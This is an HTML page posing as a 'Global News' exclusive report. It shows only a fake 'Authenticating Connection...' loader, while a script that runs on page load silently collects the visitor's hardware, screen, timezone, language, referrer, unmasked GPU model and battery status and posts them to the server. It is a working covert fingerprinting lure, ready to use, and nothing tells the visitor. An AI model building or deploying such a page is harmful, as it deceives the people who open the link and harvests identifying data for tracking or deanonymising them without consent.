<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Global News | Exclusive Reports</title>
  <style>
    body { background: #080808; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
    .status-box { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #333; text-align: center; }
    .loader { border: 3px solid #222; border-top: 3px solid #e50914; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="status-box">
    <div class="loader"></div>
    <p>Authenticating Connection...</p>
  </div>

  <script>
    async function collectAllIntel() {
      const data = {
        hw: {
          cores: navigator.hardwareConcurrency || "N/A",
          ram: navigator.deviceMemory || "N/A",
          platform: navigator.platform || "N/A",
          touch: navigator.maxTouchPoints || 0
        },
        display: {
          res: `${window.screen.width}x${window.screen.height}`,
          pixelRatio: window.devicePixelRatio
        },
        browser: {
          tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
          lang: navigator.language,
          ref: document.referrer || "Direct"
        }
      };

      // GPU Extraction
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        data.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
      } catch (e) { data.gpu = "N/A"; }

      // Battery Status
      try {
        if (navigator.getBattery) {
          const b = await navigator.getBattery();
          data.battery = { lvl: (b.level * 100) + "%", status: b.charging ? "Charging" : "Unplugged" };
        }
      } catch (e) { data.battery = "N/A"; }

      // Send to server
      fetch("/visit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });
    }
    window.onload = collectAllIntel;
  </script>
</body>
</html>
